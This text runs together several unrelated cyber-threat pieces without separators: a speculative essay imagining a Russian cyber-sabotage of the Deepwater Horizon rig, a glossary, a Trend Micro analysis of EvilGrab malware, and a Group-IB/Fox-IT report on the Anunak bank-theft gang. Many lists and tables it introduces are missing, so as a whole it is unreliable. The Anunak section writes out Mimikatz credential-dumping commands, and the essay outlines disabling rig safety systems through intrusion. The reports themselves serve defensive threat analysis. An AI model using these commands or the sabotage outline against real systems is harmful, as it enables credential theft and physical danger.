Russia used the tactic again in 2009 , shutting off gas supplies for two weeks to Ukrainian Naftogaz ostensibly because of a dispute over contract terms which had been negotiated in 2002 regarding the appropriation of gas by Naftogas .
The ordeal was only resolved after Ukraine 's Prime Minister sat down with Vladimir Putin and renegotiated a new contract for Russian gas , for which she later received a 7 year sentence on charges of abuse of power .
These events serve to highlight the importance Russia places on the energy sector as both a vital portion of its economy and a potent political tool .
The Russian economy is heavily dependent on the oil & gas industries , with 62.7 % of its economy being service based industries in 2010 .
Many economists have pointed to oil and gas prices as the Achilles heel of the Russian economy .
This was made evident in 2008 when oil prices plummeted ( as seen in the figure below ) , sending the Russian economy spiraling into a recession .
Prices hit a low in 2009 , one year before Deepwater Horizon and at a time when reports were also stating that the overall output of Russian oil for 2010 was projected to decline .
This stagnation in the economy combined with future projections of slowed oil production presented a huge threat to Russia , and it is likely that this sentiment resonated with Russian authorities .
As pointed out by a Forbes columnist , a sustained drop in oil prices like that in 2008 would mean possible civil unrest and political instability – oil and gas have that magnitude of effect .
This resonance may perhaps be seen in the Russian National Security Strategy to 2020 published in May of 2009 .
The document outlines a path for Russia to continue to regain prominent global power , and within it there are several points which lend credence to a strategic view of oil and gas resources .
The document states that `` the longer - term focus of international politics will concentrate on the possession of energy resources , notably in the Middle East , on the Barents Sea shelf and other areas of the Arctic , in the Caspian Sea Basin , and in Central Asia .
'' The same publication also states that `` the competitive search for resources does not exclude the use of force .
'' Force in this case does not necessarily indicate a military kinetic action , but exertion of both soft and hard power across all domains , including cyber .
What follows is a purely speculative narrative of one possible attack scenario , intended to highlight elements of Russian doctrine which align with aspects of the BP oil spill .
It will also include techniques and tools which provide functionality that makes such an attack feasible .
So it is possible that after the oil price crash in 2008 , Russian officials saw the danger to social and political stability in the country .
Forecasts for Russian oil output around 2009 also suggested that not only were prices dropping , but overall production would as well , envisaging the specter of future unrest and hardship .
Realizing the strategic importance of oil and the success they had garnered with previous market halts , they needed a way to either artificially inflate oil prices , increase demand for Russian oil , or increase oil output .
It is worth noting that price of natural gas ( another huge component of the Russian economy ) is inextricably linked to oil prices in most of Europe during this period because gas is price - indexed against oil .
Unlike the natural gas incidents where Russia was able to use state - controlled Gazprom to halt gas leaving the country , a sizeable portion of the oil leaving the country was from privatized companies .
It would be difficult to overtly prevent them from exporting without significant backlash from international communities ( such as the World Trade Organization where they had been seeking entry for some time ) , so action would need to be more covert .
One of the largest of these private oil firms was TNK - BP , which Russian authorities had already attempted to strong - arm into government control as they had done with other smaller oil companies like Yukos .
The other main exporter of oil to Western Europe at this time was BP plc , the 50 % owner of TNK - BP .
Therefore , control of TNK - BP would both increase oil revenues and state - output , and simultaneously decrease a prime competitor 's overall output .
It would also give them a larger political weapon that could be used as a bargaining chip or to meet the aforementioned goal of price control .
However , BP had proven recalcitrant and defiant about relinquishing TNK - BP in spite of the pressures which had already been applied .
A past rocky relationship with BP combined with their recent safety failures and cover - up in the Caspian Sea also made them a viable target .
If they could not be motivated by conventional means , then Russia would have to revert to force as pointed out earlier in their National Security Strategy to 2020 ( `` the competitive search for resources does not exclude the use of force '' ) .
Sabotage could be a viable option , however it would have to be on a large enough scale that BP would be put into a position where they would fold to Russian interests under the additional pressure .
While an on - shore explosion would cause some delays in production and potential loss of life leading to litigation , off - shore destruction would have the potential to be significantly more damaging publicly , could also include loss of life , and would incur significant environmental fines in addition to safety fines .
The question would then be where to strike – BP holdings in the Caspian Sea would be too dangerous as any failures could easily implicate Russia and any success could cause collateral damage to Russian oil assets and coastal regions .
The North Sea would be a potentially viable candidate with multiple countries being affected resulting in more economic impact on BP , however the currents are such that collateral damage could occur to other areas that Russia identified as vital fields of competition , namely the Barents Sea .
BP 's other major developments were in relatively new fields in the Gulf of Mexico ( GoM ) where BP planned to invest heavily .
Russia has long seen ( and continues to see ) American power as a dangerous counter to its own , marking the US as its top global competitor .
The GoM then would prove very attractive as it offered a two - fold bonus .
A cash - strapped United States , riddled by its own recession , would bear the brunt of the collateral damage resulting in heavy fines to BP , perhaps made heavier because of the state of the American economy .
Secondly , BP would possibly lose its asset ( s ) and right to drill offshore in the GoM , a region BP considered strategic .
It would allow for an information influence operation on the American public – poisoning the market against BP , but also potentially against the American government if they repeated any mistakes in their handling of an incident like the 2005 Hurricane Katrina rescue and relief effort .
America in 2008 and 2009 was already facing internal contention over deep water drilling practices , meaning that a significant event in the region could perhaps halt production by governmental directive .
Even with the contention , BP had already made history in the Gulf ; in mid-2009 the Deepwater Horizon rig finished drilling the deepest oil well in history in the Tiber Oil Field off the coast of Texas .
This meant that one of the top competitors for Russian oil exports was making headway in this region .
America is also the largest importer of oil , so even though oil prices are a complicated affair that takes into account aspects like the economic stability of different regions and future projections of demand , any damaging effects on American production or supply could potentially increase oil prices .
In March of 2009 , drilling of a new well , Macondo , was approved and scheduled to begin later that year , creating an ideal target .
Realistically , in a clandestine project of such importance it is likely that Russia would have identified several GoM targets , perhaps alongside BP North Sea assets as well .
Having the Gulf of Mexico in mind , Russia now needed a method for delivery .
Analyzing the 2008 incident in the Caspian Sea which was still fresh at this time , it may have been noted that one of the root causes of the blowout was a flaw in the concrete - concrete possibly provided by the same US contractor who worked for BP in the GoM : Halliburton .
They may have also surmised that if the alarms and safety systems had not activated in the Caspian Sea incident , the crew may not have been capable of reacting quickly enough to prevent an explosion , thus creating a terrible ecological disaster and causing loss of life .
So , a workable option appeared to be a covert cyber - attack on rigs operating in the gulf which disabled safety measures or created a situation where a blowout would occur .
If done correctly , they could easily hide any attribution behind China ( who had been actively stealing secrets from oil companies at this time ) , a non - state hacking group , a sporadic virus , or merely a glitch / accident .
Because of the high stakes involved in any attribution to Russia , the best option would be making it purely appear to be an accident or neglect by BP and its contractors .
This could be achieved by playing on known patterns and behaviors by BP that were risky .
The type of intelligence Russia would have been intimately familiar with through their own dealings with BP and analysis of other BP safety incident in the recent past .
This blends seamlessly with the Russian concept of `` Reflexive Control .
'' Timothy Thomas points out in his book entitled `` Recasting the Red Star '' the concept of reflexive control - as Timothy puts it : `` Reflexive control is defined as a means of conveying to a partner or an opponent specially prepared information to incline him to voluntarily make the predetermined decision desired by the initiator of the action .
'' Purposefully setting false alarms off in the early hours of the morning so that someone will disable them would be a good example of this .
Russian hackers such as the GLEG group have demonstrated proficiency in finding exploits in ICS software by releasing the Agora SCADA+ exploit kit which had a plethora of zero - day exploits in it .
This demonstrative proficiency , combined with the previously noted 2009 Mario Azar incident would suggest that the technical capability to set this in motion was readily available .
After identifying several targets in the GoM , Russian operators could easily have exploited a multitude of attack vectors .
Employee 's personal systems ( which could have VPN access to onshore control stations or the rig directly ) , mobile devices like smart - phones , portable storage devices such as usb drives , engineer laptops , or an onshore control center with access to the rigs could have been leveraged to gain access .
Such attacks could be trivially done even with open - source or free tools such as the iconic Metasploit Framework .
Metasploit 's custom payload , Meterpreter , for example is capable of residing purely in volatile memory , often leaving few residual traces on persistent storage , if any .
After identifying an entry point such as social engineering ( perhaps too high profile ) or more likely exploitation , Russian operatives could find a series of servers at the onshore control center with a long up - time or that were not regularly updated ( and therefore not regularly restarted ) .
The attackers could have leveraged these to create redundant avenues of access which run entirely in volatile memory , thus leaving minimal to no permanent traces .
More likely and stable however would be the use of such exploitation to install a persistent backdoor .
From here they could have stolen credentials or otherwise escalated privileges to gain access to the safety systems on the Deepwater Horizon and other rigs operating in the area .
It is likely that the same attack vector would not have been used in every instance to obscure any pattern analysis and diversify opportunities for success .
At this point setting off alarms in the early hours to encourage employees to disable them , impairing other safety systems and causing general instability would have been enough to subtly magnify the effects beyond a manageable level resulting in catastrophe .
After having discussed in some detail the possibility of a state actor 's involvement , it must equally be considered that there is also plenty of evidence suggesting that this was nothing more than a tragic incident .
It may also be stated that there is evidence contrary to the posed scenario .
The Deepwater horizon incident and the 2008 Caspian Sea incident before it were merely two incidents in an industry fraught with others .
Additionally , two incidents - regardless of similarity - are not conclusive enough to represent a pattern .
Should they be a part of a larger pattern , it is far more likely that these particular incidents pointed to a pattern of corporate neglect than anything else .
The inherently dangerous nature of oil refinery work would imply that accidents and loss of life are an unfortunate reality of the industry .
According to the Centers for Disease Control and Prevention , `` The fatality rate for oil and gas workers in the U.S. between 2002 and 2007 was more than 29 deaths per 100,000 workers , or about seven times the average for all occupations .
'' BP is no stranger to such hazards .
Deepwater Horizon , though perhaps their worst to date , was not their first prolific disaster .
BP was required to pay 1.6 billion dollars in victim compensation for the Texas City refinery explosion from March 23 , 2005 .
They were also required to pay 50.6 million dollars in fines for failing to fix the safety violations that were brought to them by OSHA before the explosion .
These same corporate failings were present in the Deepwater Horizon incident and were brought up during the senate hearings .
This in part serves to highlight the fact that even if the incident were to be a state - sponsored attack , the impact of the loss of a single rig or small well is relatively inconsequential to the overall oil production of the victim .
The timeline of the Deepwater Horizon incident also speaks volumes – the incident took place over the course of at least a year and was the product of many budget - saving decisions that were acknowledged to be dangerous by the engineers who were working on the Macondo well drilling effort .
These measures and a culture of risk are likely what ultimately sealed the fate of the Deepwater Horizon .
These occurrences are too intricate whilst spread over such an extended period of time for any one entity to have reasonably controlled them all .
It is within human nature to look for a pattern or design for an event even when there is n't any – this can be augmented by time as more possible `` clues '' become apparent .
For this reason such attribution which seeks out a conclusion is a slippery slope and must be approached with caution - it has a tendency to entice analysts to find facts to fit the hypothesis as opposed to a hypothesis which fits the facts .
It 's important to remember that correlation does not equal causation ; in fact correlation may be coincidental or the result of another unanticipated factor .
Likewise the circumstantial evidence alone is not conclusive .
Between 1969 and 2005 there have been over 30 separate incidents on oil rigs ranging from fires and explosions , to structural failures , some of which were blowouts not unlike the one that occurred on Deepwater Horizon .
It is likely that circumstantial information about one or more of these could be strung together to provide a reasonably convincing political ' attribution .
' Regardless of the attribution or refutation of an attack , the takeaway from the Deepwater Horizon analysis is that the oil industry is undeniably tied to the cyber domain and an attack on this sector is conceivable ; that by using currently available cyber means a kinetic , violent , and instrumental outcome could very possibly be affected on a private sector by a foreign state actor or other human - based agent to gain a favorable outcome .
The observation of a moderately sized cross - section of cyber events within the oil and gas industry clearly indicates that there is ongoing cyber conflict .
This conflict exists in the form of espionage and sabotage , and it involves both state and non - state actors .
In the case of cyber espionage , these actors are advanced in the sense that they have launched multi - year campaigns which have gone undetected as they have exflitrated what is likely untold billions of dollars in intellectual property .
There tactics represent a formalization and ritualization of the conflict which will suggests that it has been weaponized and will continue to escalate in the future .
The Chinese government is absolutely involved in some capacity , and stands to gain the most out if these transactions .
China will need to continue to make aggressive moves to sustain its need for oil going forward as its ability to meet growing demand becomes overwhelmed .
Red October , while largely targeted at diplomatic entities , also targeted the oil and gas industry .
The sophistication of the infrastructure used in Red October , as well as the methods , suggest a revolution in the type of cyber conflict that will be seen in the oil and gas industry .
A majority of these groups are still active as of April 2013 , even after being outed in reports released by antivirus and incident response companies over the last few years .
These reports themselves represent one aspect in which non - state actors will become ever more important in cyber conflict , particularly within important industries such as oil and gas .
American companies are particularly vulnerable targets to state - backed or state - owned foreign competitors who may in the future leverage their countries ' cyber forces to gain competitive advantage , or possible develop their own .
This type of competitiveness may lead to the types of sabotage exchanges seen in the Middle East .
These attacks may either have been the work of nation - states battling out policy in the cyber realm , or unconnected events with the Shamoon attacks merely being a disaffected hacktivist group expressing dissent .
Regardless of origin , these exchanges are clear examples of cyber conflict of a destructive nature .
Going forward , the sophistication of the viruses used in these attacks will likely only increase .
Attacks like the flame and Stuxnet viruses may be seen by American companies within the industry .
The line between espionage and sabotage attacks can be somewhat blurred with viruses being modular and having the capability to perform both ; gathering intel while waiting undetected to unleash a more sinister capability .
The very use of these types of malware breeds and intimacy and familiarity with them that allows for their further proliferation by the parties who were previously attacked .
Even if they can not reverse engineer them , they may understand the behaviors well enough to crudely mimic them .
As discussed at the beginning of the paper , cyber conflict is attractive .
It is attractive to criminal elements , corporate elements , individuals , hacktivists , state actors , and other sundry non - state actors alike .
Because of its low barrier to entry , availability , and outsized impact , the oil industry must prepare for sustained future conflict in this realm .
Advanced Persistent Threat : An advanced persistent threat ( APT ) uses multiple phases to break into a network , avoid detection , and harvest valuable information over the long term .
These phases are Incursion , Discovery , Capture , and Exfiltration according to Symantec .
Anonymous : A decentralized group of individuals who label themselves as `` hactivists .
'' The individuals are a non - state sponsored group .
The group frequently picks their targets based on current events or decisions of companies that conflict with an ever changing mantra of the group .
The attacks perpetrated by Anonymous are frequently not complex in nature and often are designed just to restrict access to public websites through a denial of service attack .
C2 : Command and Control Cyber Warfare : `` Actions by a nation - state to penetrate another nation 's computers or networks for the purposes of causing damage or disruption . `` Dropper virus : A type of Trojan that serves to transport and extract a viral payload onto the destination system .
The dropper is frequently made to masquerade as an innocuous executable that once executed the viral payload has been deployed .
The dropper service at this point no longer needs to be running .
Exfiltration : The opposite of infiltrate .
The act of secretly stealing information from the enemy 's control .
It is a form of espionage .
Malware : A generic term used to describe software designed to cause malicious actions on a computer system .
Trojans , Viruses , and Worms are examples of types of Malware .
Reflexive control : `` A means of conveying to a partner or an opponent specially prepared information to incline him to voluntarily make the predetermined decision desired by the initiator of the action .
'' SCADA : Supervisory control and data acquisition are a type of industrial control system usually deployed to monitor systems over long distances .
Spear phishing : The process of attempting , often through email , to acquire someone else 's user information .
This is achieved through social engineering and often involves sending emails that appear to be from a known and trusted individual .
Trojan : A type of computer malware that does not replicate , rather its primary function is to allow unauthorized access to the computer systems , steal information , or cause harm to the infected system .
A Trojan often presents itself as an innocuous file thus tricking the user into executing .
Virus : A type of computer malware that is able to self - replicate and infect multiple systems .
The replication is usually tied to a human interaction .
Highly targeted attacks refer to a category of threats that pertain to intrusions by threat actors or attackers .
These attackers aggressively pursue and compromise chosen targets in order to steal sensitive information .
These are not conducted through separate attacks ; rather , they comprise of a series of attempts over time to get deeper and deeper into a target 's network .
Each attempt may either succeed or fail , but the overall goal is to penetrate the target 's network and acquire information .
Malware is typically used as an attack vector , but the real threat involves human operators who adapt , adjust , and improve their methods based on the victim 's defenses .
Enterprises should consider targeted attacks a high - priority threat because of the considerable damage they incur .
The human and systemic weaknesses that allow an attacker to compromise an organization can be minimized and mitigated with correct practices and solutions .
However , these same weaknesses can never be fully resolved .
Trend Micro monitors the targeted attack landscape in order to identify ongoing campaigns and provide additional threat intelligence useful for identifying the existence of these campaigns in an enterprise network .
This quarterly report presents the targeted attack campaigns observed and mitigated by Trend Micro based on reported customer cases , as well as our own independently gathered data .
Targeted Attack Campaigns Profiling We encountered a variety of targeted campaigns in the second quarter of the year .
These include the following : • IXESHE .
The IXESHE campaign is known for targeting East Asian governments , electronics manufacturers , and telecommunications firms .
We released a white paper discussing this campaign .
IXESHE has been active since 2012 .
• ELISE .
This recently discovered campaign also targets government agencies in the Asia Pacific region .
It is called ELISE after certain strings found in its unpacked code .
( We detect the malware used by this campaign as BKDR_ELISE .
) • ZEGOST .
This family of backdoors ( aka HTTP Tunnel ) is Chinese in origin and was used in attacks against Asian government organizations .
• BEEBUS / MUTTER .
This is a targeted campaign believed to be associated with the Comment Crew attacker group because of the use of encrypted / obfuscated HTML comments to hide their C & C transactions .
• TravNet .
This campaign made use of a malware family identified as NetTraveler based on the strings found in the malware code .
The malware is detected as BKDR_TRAVLAR .
Our data indicates that the majority of targeted attack victims are various government agencies .
Targeted firms from the technology sector include telecommunication firms , Internet service providers , and software companies .
The financial services sector and the aerospace industry were also targeted this quarter .
The targeted attacks that we analyzed were heavily concentrated in Asia , particularly Taiwan and Japan .
Based on our findings , the most common type of email attachment type used in targeted attacks were file archives of various forms .
When uncompressed , these archives typically contain the malicious payload itself , which the user may then run directly .
Alternately , they may also contain a .DOC
file that contains exploit code .
RTF files made up the second most common file type .
Frequently , the .EXE
files we see are made to appear as ordinary documents or folders using appropriately chosen icons .
In addition , we also saw an increased use of files that make use of right - to - left override ( RTLO ) in Unicode .
We were also able to monitor the activity of various C & C servers related to targeted attacks .
By volume of C & C server activity , the following countries ranked as follows : In this report , we will provide a detailed analysis of the EvilGrab campaign .
This campaign was first found targeting certain Asian and European governments .
Its name is derived from its behavior of grabbing audio , video , and screenshots from affected machines .
Currently , the malware used by EvilGrab belongs to one of three malware families : • BKDR_HGDER • BKDR_EVILOGE • BKDR_NVICM Our research indicates that EvilGrab activity is most prevalent in China and Japan , although it is also present in other parts of the world .
Government organizations were , by far , the most affected by EvilGrab .
This geolocation is based on the IP addresses of the victims .
Therefore , foreign institutions within China would be identified as coming from China ; the same would hold true for all countries .
EvilGrab was also found in the United States , Canada , France , Spain , and Australia , among others .
Research indicates that EvilGrab is primarily distributed through spear - phishing emails with malicious attachments that exploit various vulnerabilities to run malicious code .
Among the attachment types are : A .RAR
file with a folder named thumbs.db was also seen containing malicious code .
By using this name , the intention was to disguise itself as the Windows thumbnail cache .
A shortcut file ( .LNK
) was also seen in the .RAR
file , which used a folder icon to make users believe it was another folder .
In reality , running the .LNK
file executes the malware .
In addition , the .RAR
file contains a desktop.ini file in order to change the thumbs.db folder icon into the icon of the Windows thumbnail cache .
The EvilGrab campaign 's use of exploits , payloads , and decoy documents is similar to the Taidoor campaign in 2012 .
The primary difference is that EvilGrab variants have multiple layers of shellcode .
In addition , some variants copy the file name and use it as the decoy document file name .
Other variants overwrite the exploit document with the contents of the decoy document .
As noted above , some variants also use disguised folders and shortcuts and do not use exploits to run their code .
DLL preloading is a vulnerability that has been documented for over three years .
The EvilGrab campaign makes use of this vulnerability for its AutoRun routine .
Whenever it is run , the Windows shell ( explorer.exe ) loads a component of the fax server in Windows , fxsst.dll .
This is normally located in the System32 folder .
Whenever an instance of explorer.exe is launched ( i.e. , at every system startup ) , the system searches for the said .DLL
file and loads it .
EvilGrab drops one of its .DLL
components in the Windows folder , where explorer.exe is also located .
The malicious .DLL
( also named fxsst.dll ) is loaded instead of the legitimate copy .
It also serves as the loader of the main backdoor .
While DLL preloading has been used by other malware in the past , it is less common to see it specifically target explorer.exe .
Other malware families that use this vulnerability typically target executable files outside of Windows ; EvilGrab targets a part of Windows itself .
In addition to the above behavior , EvilGrab also creates the following registry entry to enable its automatic execution at every system startup : The file % Application Data % \360\Live360.exe is a copy of one of the malware components .
It also creates a shortcut under the Startup folder in the Start menu : The above file is also a copy of one of the malicious components .
EvilGrab has three primary components : one .EXE
file and two .DLL
files .
The .EXE
file acts as the installer for all of the EvilGrab components .
One of the .DLL
files serves as a loader for the other .DLL
file , which is the main backdoor component .
Some variants of EvilGrab delete the .EXE
file after installation to cover its tracks more effectively .
As noted earlier , the loader file is named fxsst.dll .
However , examination of its header states that its actual file name is supposed to be svchost.dll .
These components are also encrypted and saved in the registry .
To add stealth to its backdoor routines , it uses a legitimate process context 's memory space to inject the main backdoor .
By default , this backdoor injects itself into the svchost.exe or winlogon.exe process .
It also checks if certain processes related to certain security products are running on the affected system .
The specific processes targeted are : Other variants of this malware also check if other security products are present .
It is not clear why EvilGrab specifically targets these products .
However , it is possible that the attackers determined that targets for this campaign are likely running these products .
EvilGrab stores its components in the following registry entries : To capture video , EvilGrab creates a capture window with the class name of ESET .
It uses the Sample Grabber filter ( part of the DirectShow technology in Windows ) to directly perform grabbing .
It also uses Wave APIs to capture audio .
EvilGrab steals user credentials related to the following applications and/or protocols : EvilGrab steals these credentials by parsing the following registry keys : It queries the above keys for related values that correspond to the applications and protocols listed earlier .
The values are then decrypted using the system library pstorec.dll .
It also steals login credential from IE autocomplete entries .
It does this by first parsing the index.dat files in the IE History folder .
It then collects autocomplete entries from the following registry key : It then initiates a brute force attack on encrypted credentials using the CryptUnprotectData API .
However , it will only try to steal passwords from IE 's password - protected sites and MSN Explorer Signup if kav.exe ( related to a security product ) is not running in the system .
If the active window is Tencent QQ ( specifically , QQ2009 through QQ2012 ) , EvilGrab will attempt to steal information by directly reading the process 's memory and checking if the class name of the focused window is not named `` EDIT .
'' The contents of the process 's memory are then saved onto the system 's hard drive as % UserProfile % \users.bin .
It is then sent back to the backdoor 's C & C server .
The file on the hard drive is encrypted ; specifically , the data is XORed with the key 0x66 .
EvilGrab also possesses keylogging capabilities .
The logged keystrokes are then sent back to the C & C and saved to % User Profile % \users.bin .
The file on the hard drive is encrypted ; specifically , the data is XORed with the key 0x66 .
Each backdoor has one to three C & C servers in its code .
Some of C & C servers that we have seen from our accumulated data are as follows : To start its connection to its C & C server , the backdoor component will first send 5-bytes ( \x01\x00\x00\x00\x33 ) .
The C & C will reply if it accepts the connection .
The backdoor then replies with a beacon message , the contents of which are as follows : Either backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns , which is recognizable by the C & C server and/or attacker .
Some of the identifiers we saw in backdoor identifier 1 are : Some of the identifiers seen in our accumulated data in backdoor identifier 2 are as follows : We noted a correlation between the MZ / PE headers of variants and the strings in backdoor identifier 2 .
Variants with a V2010-v24 identifier have a proper MZ / PE header ; variants with a V2010-v16 header have portions of their header overwritten with JPEG strings .
These variants require a loader component to load them into memory in order to be executed .
Below is a sample packet sent at the beginning of the connection : EvilGrab variants possess a wide variety of possible backdoor commands .
The table below lists its possible commands : This captured packet shows sample backdoor commands and replies : These capabilities can be used for both lateral movement within a compromised organization and to steal information .
EvilGrab steals internal user names and passwords as well as logs keystrokes .
Credentials stolen this way can be used to move within the confines of the organization 's network .
EvilGrab possesses a wide variety of information theft capabilities .
It can grab audio and video files directly from devices attached on the system ( i.e .
microphone and camera ) .
In addition , EvilGrab can upload files from the affected system to remote servers .
EvilGrab possesses a full range of capabilities that is expected in malware used in targeted attacks against organizations .
Targeted attacks pose a challenge to traditional signature - based security solutions .
To deal with these type of threats , employ solutions that include network monitoring to detect and analyze incoming threats , as well as any outgoing communication with attacking parties .
Products like Trend Micro™ Deep Discovery™ are capable of mitigating the risks from these threats .
One component of Deep Discovery , the Deep Discovery Inspector , provides network threat detection , custom sandboxing , and real - time analysis and reporting .
The second component , Deep Discovery Advisor , provides sandbox analysis of known and unknown threats that augments the capabilities of existing products like endpoint solution and email / web gateways .
It also provides visibility to network - wide security events .
The capabilities provided by solutions like Deep Discovery are necessary to provide a unified , comprehensive view of the threats an organization faces .
This information can then be used by an organization to create appropriate and proportional responses to properly protect an organization 's network .
Hereby Group - IB and Fox - IT inform that : 1 .
This report was prepared to provide infor- mation obtained as a result of Group - IB and Fox - IT research .
2 .
Description of threat technical details in this Report is given only to bring the appropriate information to the attention of information se- curity specialists .
It helps to prevent informa- tion security incidents and to minimize risks by creating awareness on the trend described in this report .
The threat technical details published in this report in any case are not for the promotion of fraud and/or other illegal activities in the financial industry , high tech industry and/or other areas .
3 .
The information published in this report may be used by interested parties at their discretion provided they make reference to Group - IB and Fox - IT .
This report describes the details and type of op- erations carried out by an organized criminal group that focuses on financial industry , such as banks and payment providers , retail industry and news , media and PR companies .
The group has its origin in more common financial fraud including theft from con- sumer and corporate bank accounts in Europe and Russia , using standard banking malware , mainly Carberp .
After the arrests of Carberp group members in Russia , some of the members were out of work , however , their experience gained from many years of crime has allowed them to enter a new niche .
One of the members quickly realized that they can steal $ 2000 a thousand times , and earn $ 2 million , but also they can steal it in one time and immediately get it with much less effort .
The anti - fraud measures employed by banks has pushed the criminals to search for new ways to make money with less bar- riers , compromising and modifying or taking data from banks , payment providers , retail and media/ PR companies are some of these methods .
From 2013 an organized criminal group intensi- fied its activity focused on banks and electronic pay- ment systems in Russia and in the post - Soviet space .
The key is that fraud occurs within the corporate network using internal payment gateways and in- ternal banking systems .
Thus money is stolen from the banks and payment systems , and not from their customers .
While this is their main and most lucra- tive activity , the gang has also ventured into other areas including the compromise of media groups and other organizations for industrial espionage and likely a trading advantage on the stock market .
In cases where the group got access to the government agency networks their aim was espionage related .
The organized criminal group backbone are citizens of both Russian and Ukrainian origin , but the group also sources a number of mainstream and specialized services from individuals and groups originating from Russia , Ukraine and Belarus .
The average sum of theft in the Russian terri- tory and in the post - Soviet space is $ 2 million per incident .
Since 2013 they have successfully gained access to networks of more than 50 Russian banks and 5 payment systems , and 2 of these institutions were deprived of their banking license .
To date the total amount of theft is over 1 billion rubles ( about 25 million dollars ) , most of it has been stolen in the second half of 2014 .
The average time from the moment of penetration into the financial institutions internal network till successful theft is 42 days .
As a result of access to internal bank networks the attackers also managed to gain access to ATM management infrastructure and infect those sys- tems with their own malicious software that further allows theft from the banks ATM systems on the attackers command .
Since 2014 the organized criminal group mem- bers began actively taking an interest in US and Eu- ropean based retail organizations .
While they were already familiar with POS malware and compromis- ing POS terminals , the widespread media attention around the Target breach and other related breaches were the reason for this move .
While the scale of breaches in this industry is still relatively low , with at least 3 successful card breaches and over a dozen retailers compromised this activity is quickly becom- ing a lucrative endeavor for this group .
To penetrate into the internal networks this organized criminal group employs targeted emailing ( spear phishing ) and infections sources from other botnets .
This is the main reason why the group is keeping in touch with owners of large botnets .
Since August 2014 the group began to create their own large botnet using a mass emailing , but not using typical exploit driveby infections .
This last move is likely to reduce the need for external contacts .
The first successful bank robbery was committed by this group in January 2013 .
In all first cases the attackers used the program RDPdoor for remote access to the bank network and the program `` MBR Eraser '' to remove traces and to crack Windows computers and servers .
Both programs were used by the members of the Carberp criminal group under the guidance of a person named Germes .
To reduce the risk of losing access to the internal bank network the attackers , in addition to malicious programs , were also used for remote access legitimate pro- grams such as Ammy Admin and Team Viewer .
Lat- er the attackers completely abandoned from usage of RDPdoor and Team Viewer .
In addition to banking and payment systems , hackers got access to e - mail servers to control all internal communications .
This approach allowed them to find out that the anomalous activity in the bank network was identified , what technique was used to identify this activity and what measures the bank employees took to solve the problem .
Email control was successfully installed regardless of used email system , MS Exchange or Lotus .
This approach allowed them to take countermeasures that created for bank and payment system employees the feeling that the problem had been solved .
The main steps of the attack progression are the following ones : 1 .
Primary infection of an ordinary employee computer .
2 .
Getting a password of a user with administra- tive rights on some computers .
For example , a password of a technical support engineer .
3 .
Gaining legitimate access to one server .
4 .
Compromising the domain administrator password from the server .
5 .
Gaining access to the domain controller and compromising of all active domain accounts .
6 .
Gaining access to e - mail and workflow servers .
7 .
Gaining access to server and banking system administrator workstations .
8 .
Installing the software to monitor activity of interesting system operators .
Usually photo and video recording was used .
9 .
Configuring remote access to servers of inter- est including firewall configuration changes .
To carry out target attacks in 2014 the hackers have finalized development of their core malware Anunak that is used along with the following tools : According to our laboratory classification the main malware is `` Anunak '' .
This trojan is used for target attacks only , mainly on banks and payment systems .
Target usage of this program allows it to remain poorly explored , providing it a good surviv- ability inside corporate networks .
The source code of the bank trojan program Carberp was used in some places of this malware .
`` Anunak '' has the following feature set : • The software called `` Mimikatz '' is built in this program .
This is an open source software that al- lows to obtain passwords of user accounts logged in the Windows system .
However , this software was considerably changed : while maintaining the capability to get account passwords the functions of user interaction and of information output for errors and program execution were eliminated .
Thus , when the malicious program is executed on the server , it will secretly compromise all the domain and local accounts , including adminis- trator accounts .
To get account passwords it is sufficient to enter two commands in succession : `` privilege : : debug '' and `` sekurlsa : : logonpass- words '' .
When this program is executed on a domain controller or an e - mail server it compro- mises virtually all the domain accounts , includ- ing administrators .
• There is also the possibility to add a file into the firewall exclusion list by creating the correspond- ing rule with the utility `` Netsh '' .
• The functions of keypress grabber as well as the function of screenshot creation are implemented in the program .
• There are also the functions to interact with the bank system iFOBS .
• The malware sends key information , screenshots and CAB - archives to its management server .
• The program is able to secretly make changes to a number of system files , presumably to remove the limitations of Microsoft Windows desktop operating systems on the number of users that may simultaneously connect to the correspond- ing PC using RDP to administer it remotely .
There is the ability to download arbitrary exe- cutable files from the management server and run them .
One of these files is the program `` AmmyAd- min '' that may be run with the arguments `` -service '' and `` -nogui '' that force it to start as a service without user interface .
`` AmmyAdmin '' allows to connect with another computer that has the same software through the server `` rl.ammyy.com '' using the IP address and the unique identifier .
As a result , the attacker gets remote access to the user computer with the running program `` AmmyAdmin '' bypassing firewalls .
The window screenshot is shown in the figure below : When the attackers gain access to servers running operating systems of the Linux family they use SSH backdoor that transmits to the malicious server the login / password data used to access the servers and provides attackers remote access to the servers .
To provide access to the server of interest the at- tackers may appropriately modify rules for firewalls Microsoft TMG , CISCO , etc .
When the attackers yet had no major malware that would secretly install the program `` AmmyAd- min '' and report to the attackers a remote access password , they used a malicious program known as `` Barus '' .
This malware is used rarely and the last time we met it in 2013 .
This malicious program is developed by Russian - speaking authors .
In the control panel you can notice a field `` Ammy ID '' , its usage allowed the attackers to connect remotely .
At the very beginning of their activity in 2013 due to lack of the target Trojan the attackers began to distribute Andromeda and Pony .
They distributed these malware using Driveby through a bunch of Neutrino Exploit Kit exploits as shown in the figure below .
It is interesting that in the autumn 2013 they used the site http : //php.net/ as traffic source to Magnitude EK .
They redirected the traffic from this resource since July 2013 , but this fact was discov- ered much later .
The name of one of the streams to distribute the malware is `` LOL BANK FUCKIUNG '' that corresponded to the attacker activities .
Parallel to this technique they also use another infection method , which was one of the principal methods .
The main method of distribution is send- ing emails with malicious attachments on behalf of the Central Bank of the Russian Federation , a poten- tial client or an real counterparty ( at first the attack- ers had cracked this counterparty account , then they used emailing with the cracked contact list ) .
Another used method is to install a special malware to carry out targeted attacks via another malware that might appear in the local network by accident .
To find such malicious programs the criminal group keeps in touch with several owners of large botnets that massively distributes their mal- ware .
The attackers buy from these botnet owners the information about IP - addresses of computers where the botnet owners have installed malware and then check whether the IP - address belongs to the financial and government institutions .
If the mal- ware is in the subnet of interest , the attackers pay the large botnet owner for installation of their target malware .
Such partner relations were established with owners of botnets Zeus , Shiz Ranbyus .
All of these trojans are bank Trojans , their usage is ex- plained by the previously established relationships .
In late 2013 the hacker under the alias Dinhold be- gan to build his own botnet using modified Carberp , having uploaded its source code for public access .
The attackers were trying to create similar relations with this hacker , but in 2014 he was arrested , having not developed his botnet up to the required level .
To check whether the IP - address belongs to the desired network the following script is used : The most dangerous emailings are those that are sent on behalf of partners with whom financial and government institutions communicates permanently by email .
